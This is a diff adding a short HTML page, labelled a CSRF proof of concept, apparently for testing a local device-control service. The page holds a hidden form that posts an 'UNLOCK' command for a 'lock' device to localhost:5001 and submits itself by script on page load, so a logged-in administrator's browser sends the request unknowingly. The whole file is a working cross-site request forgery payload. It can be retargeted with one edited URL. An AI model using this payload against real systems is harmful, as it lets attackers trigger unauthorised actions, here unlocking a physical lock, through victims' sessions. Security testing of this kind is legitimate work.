@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF PoC</title>
+</head>
+<body>
+  <h1>CSRF Proof of Concept</h1>
+  <p>If the administrator is logged in, this page will send an unlock request automatically.</p>
+
+  <form id="csrfForm" action="http://localhost:5001/command" method="POST">
+    <input type="hidden" name="device" value="lock">
+    <input type="hidden" name="action" value="UNLOCK">
+  </form>
+
+  <script>
+    document.getElementById("csrfForm").submit();
+  </script>
+</body>
+</html>
+
